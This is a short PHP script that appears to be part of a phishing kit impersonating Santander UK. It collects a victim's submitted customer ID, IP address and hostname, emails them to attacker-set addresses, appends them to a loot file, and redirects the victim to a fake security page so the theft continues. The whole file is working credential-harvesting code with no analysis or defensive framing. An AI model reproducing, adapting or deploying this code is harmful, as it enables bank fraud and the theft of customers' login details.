<?php
include 'config.php';
include 'antibots.php';
$ip = getenv("REMOTE_ADDR");
$message .= "----------------- SANTANDER UK -----------------\n";
$message .= "--------------------   INFO   --------------------\n";
$message .= "Costumer ID        : ".$_POST['zbalbola']."\n";
$message .= "-------------------- IP INFO --------------------\n";
$message .= "IP                 : $ip\n";
$message .= "HOST               : ".gethostbyaddr($ip)."\n";
$message .= "----------------- BY Oussama El-Aari -----------------\n";
$cc = $_POST['ccn'];
$subject = "LOGIN SANTANDER [ $ip2 | $os ]";
$headers = "From: SANTANDER <admin>" . "\r\n";
mail($to,$subject,$message,$headers);
    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
mail($SANTANDER,$subject,$message,$headers);
header("Location: security.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>